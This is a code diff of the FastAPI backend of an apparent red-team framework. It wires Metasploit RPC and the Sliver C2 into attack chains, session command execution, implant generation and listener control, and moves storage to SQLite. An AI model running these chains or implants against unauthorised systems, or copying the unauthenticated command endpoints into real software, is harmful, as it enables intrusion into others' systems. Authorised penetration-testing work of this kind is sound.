+        chain_exec["current_step"] = step["step_id"]
+        chain_exec["progress"] = int((step["step_id"] - 1) / chain_exec["total_steps"] * 100)
+        step_status = {"step_id": step["step_id"], "step_name": step["step_name"], "status": "running", "started_at": datetime.now(timezone.utc).isoformat(), "command_results": []}
+        chain_exec["step_statuses"][str(step["step_id"])] = step_status
+        condition_met = True
+        for cmd in step["commands"]:
+            condition = cmd.get("condition", "")
+            if condition:
+                results = scan_progress.get(scan_id, {}).get("results", {})
+                results_text = json.dumps(results).lower()
+                if condition == "sqli" and "sql injection" not in results_text:
+                    condition_met = False
+                elif condition == "shell" and not session_manager.has_active(scan_id):
+                    condition_met = False
+                elif condition == "linux" and (credential_vault.get_context(scan_id) or {}).get("os_info", {}).get("os") != "linux":
+                    condition_met = False
+                elif condition == "windows" and (credential_vault.get_context(scan_id) or {}).get("os_info", {}).get("os") != "windows":
+                    condition_met = False
+        if not condition_met:
+            step_status["status"] = "skipped"
+            step_status["completed_at"] = datetime.now(timezone.utc).isoformat()
+            chain_exec["results"].append(step_status)
+            await asyncio.sleep(0.2)
+            continue
+        step_success = True
+        for cmd in step["commands"]:
+            try:
+                command_str = cmd.get("command", "")
+                if scan_id:
+                    command_str = credential_vault.inject_context(command_str, scan_id, target, chain_exec.get("context", {}))
+                if cmd.get("module"):
+                    result = await run_metasploit(cmd["module"], target, None, {}, chain_exec.get("context", {}).get("lhost"), 4444)
+                    if result.get("session_opened") and scan_id:
+                        session_manager.register(scan_id, {"id": f"chain_{execution_id}_{step['step_id']}", "host": target, "type": "shell", "source": cmd["module"]})
+                else:
+                    await asyncio.sleep(1)
+                    result = {"command": command_str, "tool": cmd.get("tool", "shell"), "simulated": True, "success": True, "output": f"[SIM] Executed: {command_str[:120]}"}
+                step_status["command_results"].append(result)
+            except Exception as e:
+                step_status["command_results"].append({"error": str(e), "success": False})
+                step_success = False
+        step_status["status"] = "completed" if step_success else "failed"
+        step_status["completed_at"] = datetime.now(timezone.utc).isoformat()
+        chain_exec["results"].append(step_status)
+        await asyncio.sleep(0.5)
+    chain_exec["status"] = "completed"
+    chain_exec["progress"] = 100
+    chain_exec["completed_at"] = datetime.now(timezone.utc).isoformat()
+    if scan_id:
+        chain_exec["vault_summary"] = credential_vault.get_vault_summary(scan_id)
+        await credential_vault.save_to_db(scan_id)
+    # Persist to SQLite
+    await repo.chain_exec_update(execution_id, status="completed", progress=100, results=chain_exec["results"], step_statuses=chain_exec["step_statuses"], vault_summary=chain_exec.get("vault_summary"), completed_at=chain_exec["completed_at"])
+
+@api_router.get("/chains/execution/{execution_id}")
+async def get_chain_execution_status(execution_id: str):
+    if execution_id in active_chains:
+        chain = active_chains[execution_id]
+        return {"id": chain["id"], "chain_id": chain["chain_id"], "chain_name": chain["chain_name"], "target": chain["target"], "status": chain["status"], "current_step": chain["current_step"], "total_steps": chain["total_steps"], "progress": chain.get("progress", 0), "step_statuses": chain.get("step_statuses", {}), "results": chain.get("results", []), "created_at": chain.get("created_at"), "completed_at": chain.get("completed_at")}
+    exec_doc = await repo.chain_exec_get(execution_id)
+    if exec_doc:
+        return exec_doc
+    raise HTTPException(status_code=404, detail="Execution not found")
+
+@api_router.post("/chains/execution/{execution_id}/step/{step_id}")
+async def execute_chain_step(execution_id: str, step_id: int):
+    chain_exec = active_chains.get(execution_id)
+    if not chain_exec:
+        raise HTTPException(status_code=404, detail="Execution not found")
+    step = None
+    for s in chain_exec["commands"]:
+        if s["step_id"] == step_id:
+            step = s
+            break
+    if not step:
+        raise HTTPException(status_code=404, detail="Step not found")
+    if "step_statuses" not in chain_exec:
+        chain_exec["step_statuses"] = {}
+    chain_exec["step_statuses"][str(step_id)] = {"step_id": step_id, "step_name": step["step_name"], "status": "running", "started_at": datetime.now(timezone.utc).isoformat(), "command_results": []}
+    step_results = chain_exec["step_statuses"][str(step_id)]
+    step_success = True
+    for cmd in step["commands"]:
+        try:
+            if cmd.get("module"):
+                result = await run_metasploit(cmd["module"], chain_exec["target"], None, {}, None, 4444)
+            else:
+                result = {"command": cmd["command"], "tool": cmd.get("tool", "shell"), "simulated": True, "success": True, "output": f"[SIM] Executed: {cmd['command'][:120]}"}
+            step_results["command_results"].append(result)
+        except Exception as e:
+            step_results["command_results"].append({"error": str(e), "success": False})
+            step_success = False
+    step_results["status"] = "completed" if step_success else "failed"
+    step_results["completed_at"] = datetime.now(timezone.utc).isoformat()
+    chain_exec["results"].append(step_results)
+    chain_exec["current_step"] = step_id
+    completed_steps = sum(1 for s in chain_exec.get("step_statuses", {}).values() if s.get("status") in ["completed", "failed"])
+    chain_exec["progress"] = int((completed_steps / chain_exec["total_steps"]) * 100)
+    if completed_steps >= chain_exec["total_steps"]:
+        chain_exec["status"] = "completed"
+        chain_exec["completed_at"] = datetime.now(timezone.utc).isoformat()
+    return step_results
+
+
+# ============ DYNAMIC TOOL CATALOG ============
 
 @api_router.post("/tools/add")
 async def add_custom_tool(data: Dict[str, Any]):
-    """Add a custom tool to the catalog"""
     tool_id = data.get("id", "").lower().replace(" ", "_")
     if not tool_id or not data.get("cmd"):
         raise HTTPException(status_code=400, detail="id and cmd required")
-    
-    RED_TEAM_TOOLS[tool_id] = {
-        "phase": data.get("phase", "reconnaissance"),
-        "mitre": data.get("mitre", ""),
-        "cmd": data.get("cmd"),
-        "desc": data.get("desc", "Custom tool")
-    }
-    
-    # Persist to DB
-    await db.custom_tools.update_one({"id": tool_id}, {"$set": {"id": tool_id, **RED_TEAM_TOOLS[tool_id]}}, upsert=True)
+    RED_TEAM_TOOLS[tool_id] = {"phase": data.get("phase", "reconnaissance"), "mitre": data.get("mitre", ""), "cmd": data.get("cmd"), "desc": data.get("desc", "Custom tool")}
+    await repo.custom_tool_upsert(tool_id, data.get("phase", "reconnaissance"), data.get("mitre", ""), data.get("cmd"), data.get("desc", "Custom tool"))
     return {"status": "added", "tool": RED_TEAM_TOOLS[tool_id]}
 
 @api_router.delete("/tools/{tool_id}")
 async def remove_custom_tool(tool_id: str):
-    """Remove a custom tool"""
     if tool_id in RED_TEAM_TOOLS:
         del RED_TEAM_TOOLS[tool_id]
-        await db.custom_tools.delete_one({"id": tool_id})
+        await repo.custom_tool_delete(tool_id)
         return {"status": "removed", "tool_id": tool_id}
     raise HTTPException(status_code=404, detail="Tool not found")
 
 @api_router.post("/metasploit/modules/add")
 async def add_custom_msf_module(data: Dict[str, Any]):
-    """Add a custom MSF module"""
     if not data.get("name"):
         raise HTTPException(status_code=400, detail="name required")
-    module = {
-        "name": data["name"],
-        "desc": data.get("desc", ""),
-        "rank": data.get("rank", "normal"),
-        "category": data.get("category", "exploit"),
-        "mitre": data.get("mitre", "")
-    }
+    module = {"name": data["name"], "desc": data.get("desc", ""), "rank": data.get("rank", "normal"), "category": data.get("category", "exploit"), "mitre": data.get("mitre", "")}
     METASPLOIT_MODULES.append(module)
-    await db.custom_modules.update_one({"name": module["name"]}, {"$set": module}, upsert=True)
+    await repo.custom_module_upsert(module["name"], module["desc"], module["rank"], module["category"], module["mitre"])
     return {"status": "added", "module": module}
 
 
@@ -2476,23 +1685,17 @@ async def add_custom_msf_module(data: Dict[str, Any]):
 
 @api_router.websocket("/ws/scan/{scan_id}")
 async def websocket_scan(websocket: WebSocket, scan_id: str):
-    """WebSocket for real-time scan progress"""
     await websocket.accept()
     if scan_id not in active_connections:
         active_connections[scan_id] = []
     active_connections[scan_id].append(websocket)
-    
     try:
         while True:
-            # Keep connection alive, send updates
             if scan_id in scan_progress:
                 p = scan_progress[scan_id]
                 await websocket.send_json({
-                    "type": "scan_update",
-                    "scan_id": scan_id,
-                    "status": p["status"],
-                    "progress": p["progress"],
-                    "current_tool": p["current_tool"],
+                    "type": "scan_update", "scan_id": scan_id, "status": p["status"],
+                    "progress": p["progress"], "current_tool": p["current_tool"],
                     "results": p["results"],
                     "tactical_decisions": p.get("tactical_decisions", []),
                     "suggested_chains": p.get("suggested_chains", []),
@@ -2500,7 +1703,6 @@ async def websocket_scan(websocket: WebSocket, scan_id: str):
                 })
                 if p["status"] in ["completed", "error"]:
                     break
-            
             await asyncio.sleep(1)
     except Exception:
         pass
@@ -2512,25 +1714,18 @@ async def websocket_scan(websocket: WebSocket, scan_id: str):
         except Exception:
             pass
 
-
 @api_router.websocket("/ws/chain/{execution_id}")
 async def websocket_chain(websocket: WebSocket, execution_id: str):
-    """WebSocket for real-time chain execution progress"""
     await websocket.accept()
     try:
         while True:
             if execution_id in active_chains:
                 chain = active_chains[execution_id]
                 await websocket.send_json({
-                    "type": "chain_update",
-                    "id": chain["id"],
-                    "chain_id": chain["chain_id"],
-                    "chain_name": chain["chain_name"],
-                    "status": chain["status"],
-                    "current_step": chain["current_step"],
-                    "total_steps": chain["total_steps"],
-                    "progress": chain.get("progress", 0),
-                    "step_statuses": chain.get("step_statuses", {}),
+                    "type": "chain_update", "id": chain["id"], "chain_id": chain["chain_id"],
+                    "chain_name": chain["chain_name"], "status": chain["status"],
+                    "current_step": chain["current_step"], "total_steps": chain["total_steps"],
+                    "progress": chain.get("progress", 0), "step_statuses": chain.get("step_statuses", {}),
                     "results": chain.get("results", [])
                 })
                 if chain["status"] in ["completed", "error"]:
@@ -2538,7 +1733,6 @@ async def websocket_chain(websocket: WebSocket, execution_id: str):
             else:
                 await websocket.send_json({"type": "chain_not_found", "id": execution_id})
                 break
-            
             await asyncio.sleep(1)
     except Exception:
         pass
@@ -2556,68 +1750,48 @@ import modules.sliver_c2 as sliver_module
 
 @api_router.get("/msf/status")
 async def msf_rpc_status():
-    """Check msfrpcd connection status"""
     return msf_module.get_msf_status(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
 
 @api_router.post("/msf/connect")
 async def msf_rpc_connect():
-    """Force reconnect to msfrpcd with diagnostics"""
     msf_module.disconnect_msf()
-    status = msf_module.get_msf_status(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
-    return status
+    return msf_module.get_msf_status(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
 
 @api_router.get("/msf/diagnostics")
 async def msf_diagnostics():
-    """Get detailed MSF RPC connection diagnostics"""
     return msf_module.get_connection_detail()
 
 @api_router.get("/msf/search")
 async def msf_rpc_search(query: str = "", module_type: str = ""):
-    """Search modules via msfrpcd"""
     if not msf_module.is_connected():
-        return {"modules": [], "source": "static", "hint": "msfrpcd not connected, showing static modules"}
+        return {"modules": [], "source": "static", "hint": "msfrpcd not connected"}
     modules = msf_module.search_modules(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, query, module_type)
     return {"modules": modules, "source": "msfrpcd", "count": len(modules)}
 
 @api_router.get("/msf/module/info")
 async def msf_rpc_module_info(module_type: str, module_name: str):
-    """Get module details via msfrpcd"""
     return msf_module.get_module_info(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, module_type, module_name)
 
 @api_router.post("/msf/module/execute")
 async def msf_rpc_execute(data: Dict[str, Any]):
-    """Execute module via msfrpcd"""
-    return msf_module.execute_module(
-        MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT,
-        data.get("module_type", "exploit"),
-        data.get("module_name", ""),
-        data.get("options", {})
-    )
+    return msf_module.execute_module(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, data.get("module_type", "exploit"), data.get("module_name", ""), data.get("options", {}))
 
 @api_router.get("/msf/sessions")
 async def msf_rpc_sessions():
-    """List active Metasploit sessions"""
     sessions = msf_module.list_sessions(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
     return {"sessions": sessions, "count": len(sessions)}
 
 @api_router.post("/msf/session/command")
 async def msf_rpc_session_command(data: Dict[str, Any]):
-    """Run command on MSF session"""
-    return msf_module.session_command(
-        MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT,
-        data.get("session_id", ""),
-        data.get("command", "")
-    )
+    return msf_module.session_command(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, data.get("session_id", ""), data.get("command", ""))
 
 @api_router.get("/msf/jobs")
 async def msf_rpc_jobs():
-    """List active MSF jobs"""
-    jobs = msf_module.list_jobs(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
-    return {"jobs": jobs, "count": len(jobs)}
+    msf_jobs = msf_module.list_jobs(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
+    return {"jobs": msf_jobs, "count": len(msf_jobs)}
 
 @api_router.post("/msf/job/kill")
 async def msf_rpc_kill_job(data: Dict[str, Any]):
-    """Kill a MSF job"""
     return msf_module.kill_job(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT, data.get("job_id", ""))
 
 
@@ -2625,66 +1799,39 @@ async def msf_rpc_kill_job(data: Dict[str, Any]):
 
 @api_router.get("/sliver/status")
 async def sliver_status():
-    """Check Sliver C2 connection status"""
     return await sliver_module.get_status(SLIVER_CONFIG_PATH)
 
 @api_router.get("/sliver/sessions")
 async def sliver_sessions():
-    """List Sliver sessions"""
     sessions = await sliver_module.list_sessions(SLIVER_CONFIG_PATH)
     return {"sessions": sessions, "count": len(sessions)}
 
 @api_router.get("/sliver/beacons")
 async def sliver_beacons():
-    """List Sliver beacons"""
     beacons = await sliver_module.list_beacons(SLIVER_CONFIG_PATH)
     return {"beacons": beacons, "count": len(beacons)}
 
 @api_router.get("/sliver/implants")
 async def sliver_implants():
-    """List Sliver implants"""
     implants = await sliver_module.list_implants(SLIVER_CONFIG_PATH)
     return {"implants": implants, "count": len(implants)}
 
 @api_router.post("/sliver/implant/generate")
 async def sliver_generate_implant(data: Dict[str, Any]):
-    """Generate a Sliver implant"""
     effective_lhost = data.get("lhost") or get_effective_lhost() or "127.0.0.1"
     effective_lport = data.get("lport") or global_config.get("listener_port", 443)
-    return await sliver_module.generate_implant(
-        SLIVER_CONFIG_PATH,
-        name=data.get("name", "implant"),
-        lhost=effective_lhost,
-        lport=effective_lport,
-        os_target=data.get("os", "linux"),
-        arch=data.get("arch", "amd64"),
-        implant_type=data.get("type", "session"),
-        format_type=data.get("format", "executable")
-    )
+    return await sliver_module.generate_implant(SLIVER_CONFIG_PATH, name=data.get("name", "implant"), lhost=effective_lhost, lport=effective_lport, os_target=data.get("os", "linux"), arch=data.get("arch", "amd64"), implant_type=data.get("type", "session"), format_type=data.get("format", "executable"))
 
 @api_router.post("/sliver/session/exec")
 async def sliver_session_exec(data: Dict[str, Any]):
-    """Execute command on Sliver session"""
-    return await sliver_module.session_exec(
-        SLIVER_CONFIG_PATH,
-        data.get("session_id", ""),
-        data.get("command", "")
-    )
+    return await sliver_module.session_exec(SLIVER_CONFIG_PATH, data.get("session_id", ""), data.get("command", ""))
 
 @api_router.post("/sliver/listener/start")
 async def sliver_start_listener(data: Dict[str, Any]):
-    """Start a Sliver listener"""
-    return await sliver_module.start_listener(
-        SLIVER_CONFIG_PATH,
-        lhost=data.get("lhost", "0.0.0.0"),
-        lport=data.get("lport", 443),
-        protocol=data.get("protocol", "mtls")
-    )
+    return await sliver_module.start_listener(SLIVER_CONFIG_PATH, lhost=data.get("lhost", "0.0.0.0"), lport=data.get("lport", 443), protocol=data.get("protocol", "mtls"))
 
 @api_router.post("/sliver/reconnect")
 async def sliver_reconnect():
-    """Force reconnect to Sliver C2"""
-    global _sliver_client, _sliver_connected
     sliver_module._sliver_client = None
     sliver_module._sliver_connected = False
     sliver_module._sliver_retry_count = 0
@@ -2692,50 +1839,53 @@ async def sliver_reconnect():
 
 @api_router.post("/c2/reconnect")
 async def c2_reconnect_all():
-    """Force reconnect both MSF and Sliver"""
     msf_module.disconnect_msf()
     sliver_module._sliver_client = None
     sliver_module._sliver_connected = False
     sliver_module._sliver_retry_count = 0
-
     msf_status = msf_module.get_msf_status(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
     sliver_stat = await sliver_module.get_status(SLIVER_CONFIG_PATH)
     return {"metasploit": msf_status, "sliver": sliver_stat}
 
-# ============ C2 UNIFIED DASHBOARD ============
-
 @api_router.get("/c2/dashboard")
 async def c2_dashboard():
-    """Unified C2 dashboard - MSF + Sliver status"""
     msf_status = msf_module.get_msf_status(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT)
     sliver_stat = await sliver_module.get_status(SLIVER_CONFIG_PATH)
-    
     msf_sessions = msf_module.list_sessions(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT) if msf_status.get("connected") else []
-    msf_jobs = msf_module.list_jobs(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT) if msf_status.get("connected") else []
-    
+    msf_jobs_list = msf_module.list_jobs(MSF_RPC_TOKEN, MSF_RPC_HOST, MSF_RPC_PORT) if msf_status.get("connected") else []
     sliver_sess = await sliver_module.list_sessions(SLIVER_CONFIG_PATH) if sliver_stat.get("connected") else []
     sliver_bcn = await sliver_module.list_beacons(SLIVER_CONFIG_PATH) if sliver_stat.get("connected") else []
-    
     return {
-        "metasploit": {
-            **msf_status,
-            "sessions": msf_sessions,
-            "session_count": len(msf_sessions),
-            "jobs": msf_jobs,
-            "job_count": len(msf_jobs)
-        },
-        "sliver": {
-            **sliver_stat,
-            "sessions": sliver_sess,
-            "session_count": len(sliver_sess),
-            "beacons": sliver_bcn,
-            "beacon_count": len(sliver_bcn)
-        }
+        "metasploit": {**msf_status, "sessions": msf_sessions, "session_count": len(msf_sessions), "jobs": msf_jobs_list, "job_count": len(msf_jobs_list)},
+        "sliver": {**sliver_stat, "sessions": sliver_sess, "session_count": len(sliver_sess), "beacons": sliver_bcn, "beacon_count": len(sliver_bcn)}
     }
 
+
+# =============================================================================
+# STARTUP / SHUTDOWN
+# =============================================================================
 app.include_router(api_router)
-app.add_middleware(CORSMiddleware, allow_credentials=True, allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','), allow_methods=["*"], allow_headers=["*"])
+app.add_middleware(CORSMiddleware, allow_credentials=True, allow_origins=config.cors_origins.split(','), allow_methods=["*"], allow_headers=["*"])
+
+@app.on_event("startup")
+async def startup():
+    logger.info(f"Initializing SQLite database: {config.db_path}")
+    await repo.init(config.db_path)
+    await load_global_config()
+    # Load custom tools from DB
+    custom_tools = await repo.custom_tools_list()
+    for t in custom_tools:
+        RED_TEAM_TOOLS[t["id"]] = {"phase": t.get("phase", ""), "mitre": t.get("mitre", ""), "cmd": t.get("cmd", ""), "desc": t.get("description", "")}
+    custom_mods = await repo.custom_modules_list()
+    for m in custom_mods:
+        METASPLOIT_MODULES.append({"name": m["name"], "desc": m.get("description", ""), "rank": m.get("rank", "normal"), "category": m.get("category", "exploit"), "mitre": m.get("mitre", "")})
+    logger.info(f"Red Team Framework v6.0 started [mode={config.app_mode}, db={config.db_path}]")
+    if config.warnings:
+        for w in config.warnings:
+            logger.warning(f"Config: {w}")
 
 @app.on_event("shutdown")
-async def shutdown_db_client():
-    client.close()
+async def shutdown():
+    logger.info("Shutting down...")
+    await jobs.cleanup()
+    await repo.close()
